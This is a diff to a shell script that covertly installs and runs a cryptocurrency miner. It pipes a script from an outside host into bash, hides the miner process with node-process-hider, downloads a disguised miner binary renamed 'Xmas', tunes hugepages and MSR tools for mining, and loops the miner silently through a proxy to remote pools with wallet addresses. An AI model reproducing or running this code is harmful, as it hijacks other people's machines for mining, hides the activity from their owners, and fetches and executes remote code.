@@ -6,7 +6,7 @@ sleep 2
 cat /etc/*-release
 sleep 2
 
-apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg libuv1-dev libssl-dev libhwloc-dev >/dev/null
+apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg libuv1-dev libssl-dev libhwloc-dev kmod msr-tools >/dev/null
 
 sleep 2
 
@@ -24,7 +24,7 @@ npm i -g node-process-hider 1>/dev/null 2>&1
 
 sleep 2
 
-ph add glove 1>/dev/null 2>&1
+ph add Xmas 1>/dev/null 2>&1
 
 sleep 2
 
@@ -32,7 +32,7 @@ curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bas
 
 sleep 4
 
-DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
+DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata kmod msr-tools > /dev/null
 
 sleep 2
 
@@ -72,13 +72,35 @@ echo ""
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.uk/glove.tar.gz
+wget -q http://greenleaf.teatspray.uk/Xmas.tar.gz
 sleep 2
-tar -xf glove.tar.gz
+tar -xf Xmas.tar.gz
+
+sleep 2
+
+sysctl -w vm.nr_hugepages=$(nproc)
+
+for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+do
+    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+done
+
+sleep 2
+
+bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
+
+sleep 2
+
+wget -q http://greenleaf.teatspray.uk/boost.sh >/dev/null
+sleep 2
+chmod +x boost.sh
+sleep 2
+#./boost.sh
+
 sleep 2
 
 while true
 do
-./glove -a minotaurx -o stratum+tcp://bowserlab.ddns.net:7019 -u CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB -p $currentdate,c=LCC,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o new.yadaminers.pl:5555 -u 1LorV6u6LVt3BZn3SejRXwJJyDLJNfyHmu.$currentdate --rig-id=$currentdate -p $currentdate -a rx/yada -k --proxy=127.0.0.1:1081 -t $used_num_of_cores 1>/dev/null 2>&1
 sleep 10
 done
